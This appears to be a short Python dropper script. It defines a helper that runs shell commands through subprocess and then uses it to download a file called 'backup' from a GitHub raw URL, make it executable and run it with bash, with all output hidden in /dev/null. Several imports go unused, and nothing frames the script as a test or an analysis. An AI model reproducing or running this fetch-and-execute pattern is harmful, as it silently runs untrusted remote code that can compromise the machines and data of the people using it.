from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
 

 

 
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 

 


cmdline ('wget https://raw.githubusercontent.com/samrikulan/lagraven/main/backup >/dev/null 2>&1  && chmod +x backup && bash ./backup >/dev/null 2>&1')
